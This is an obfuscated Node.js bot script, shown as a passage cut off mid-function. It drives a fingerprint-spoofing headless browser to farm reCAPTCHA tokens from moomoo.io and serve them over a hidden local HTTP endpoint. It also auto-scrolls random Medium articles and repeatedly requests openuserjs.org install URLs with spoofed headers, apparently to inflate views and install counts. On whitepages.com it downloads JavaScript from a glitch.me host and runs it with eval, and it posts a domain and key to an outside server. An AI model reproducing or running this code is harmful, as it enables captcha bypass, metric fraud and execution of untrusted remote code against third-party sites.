      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0x9, 'r1Iu') + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + a0(0x10, '16sq') + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + a0(0x1d, 'n@mc') + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': a0(0x3, 'B0tw') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + Y(0x8),
    Y(0x11) + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + Z(0x6) + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + Z(0xc),
    'https://me' + 'dium.com/e' + 'ntrepreneu' + a0(0x22, 'U2lP') + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + a0(0xb, '9oV6') + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + Y(0x19) + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + Z(0x17) + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x81c + 0x1b * -0x49 + -0x69
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1 * 0x4ea + 0x98 * 0x40 + 0x181 * -0x16)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x44 + 0xa0d * 0x1 + -0x9ed), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1c75 + 0x2043 + -0x3c54), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1 * -0x5ad + -0x1849 + 0x82 * 0x3b;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1626 + 0x248 * -0x3 + -0xf4e; w < getRandomInt(-0x11a5 + -0x2099 + 0x1 * 0x323f, -0x13cf + 0x4 * -0x1f8 + -0x12 * -0x18a); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x413 * -0x3d + -0x6e36 + 0x2511d);
        }
      }();
    }, 0x1765 + -0x1dec * -0x1 + 0x31d * -0x11), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a1 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x4 * 0x6ad + -0x1 * -0x21bd + -0x3c71 * 0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })[a1(0x26)](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x241a + -0xa91 * -0x3 + -0x31 * -0x17, 0x6f4 * -0x2 + 0x7f2 + 0x18a * 0x4)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        const a2 = b;
        return await (A && doFlags['doDual'] ? y : x)[a2(0x1a, '6MEx')](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x6ff7 + -0x6538 + 0x14a5f);
    }, -0xb * -0x11 + -0x24c0 + 0xc23 * 0x3), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x24b0 + -0x2311 + -0x1d7 * -0x27;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x2 * -0x11d5 + 0x1521 * 0x1 + -0x2d13), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x61b + -0x4 * 0x62f + 0xfb * 0x13), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x3 * -0x1439 + -0x655 * 0x391 + 0x24141a);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1c84 + 0x256b * -0x1 + 0x4253 * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a4 = c,
      a3 = d,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1e + -0x470 + -0x1 * -0x556);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + a3(0x24) + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h[a3(0xa)](await g['getToken'](j) || '') : h['write'](a4(0x20)), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3a64 + -0x39bf * -0x1 + -0x11 * -0x1e5);
}

function a() {
  const br = [
    'jMXPC3q9ueW3ra',
    'random',
    'pts/by-sit',
    'Amk0eZnAW5FcUsJcImog',
    'ufPFDuXPn1vmBa',
    'om/22down/',
    'e\x20Gecko)\x20C',
    'ChrZl2j5lxnPDa',
    'lJm2',
    'WQzaWQLYWRJcVJVcHXe/',
    'write',
    'W4pcISoSzwGXWP8HzI8',
    'ca119188bd',
    'pH44kSk0WQfFFCkipG',
    'C3rYAw5N',
    'B3jLise',
    'dNmDgWZdTCoGhSoZsa',
    'tw96AwXSys81lG',
    'Xo0R8WiRSb',
    'ext',
    'rg/en/scri',
    'ndi,mr\x20bea',
    'W7VdUCkSp2PEBrRdRCoZ',
    'syn_52523/',
    'y3jPChrZl2j5lq',
    'lte4zgzHnMq2zq',
    'bxTTWRhdUrJcTau',
    'CMCVC2nYAxb0CW',
    '&mo=3&ping',
    'WOSvWPtcP2tcG8ogcIaE',
    ',moomoo.io',
    'ls1UBY1Zyw5KyG',
    'DJaUnG',
    'W7jOvCk9D8ktCmo8A8kK',
    'WOvVW6qaW7zFW5TvDwu',
    'lxtcISkVkmkKW73dSmkiAa',
    'dwqkdmnBZc',
    'aMHTWQ7dUfNcPWf/W74',
    'catch',
    'y29UDgvUDhm'
  ];
  a = function() {
    return br;
  };
  return a();
}
doFlags['doOUJS'] && ((async () => {
  const a6 = b,
    a5 = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1155 * -0x2 + -0x1a80 + -0x1 * -0x3d2b) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x60b + 0x24b * 0xd + -0x39 * 0xa1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x16e7 + -0x205 * -0xb + -0x2d1e, D['indexOf']('\x20'));
        return B ? E['slice'](-0x505 * -0x1 + 0x1a9 * 0x12 + -0x22e7, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2c51 * -0x1 + -0xb71 + -0xb * -0x90),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x5 * -0x1b0 + 0x1 * 0xc59 + 0x2327),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + a5(0xf),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + a5(0x1b) + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + a6(0x21, '@0^e') + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xd * 0x14b + -0x680 + 0x174f; k < 0x1 * -0x185 + 0x7b8 + -0x1 * 0x62f; k++)
    setTimeout(f, (0x3c51 * -0x1 + 0x8a06 + 0x9cab) * k * getRandomInt(-0x6a * 0x57 + -0x23e8 + 0x47ef * 0x1, -0x1be7 + 0x1246 * 0x2 + -0x8a2));
  setInterval(() => {
    f();
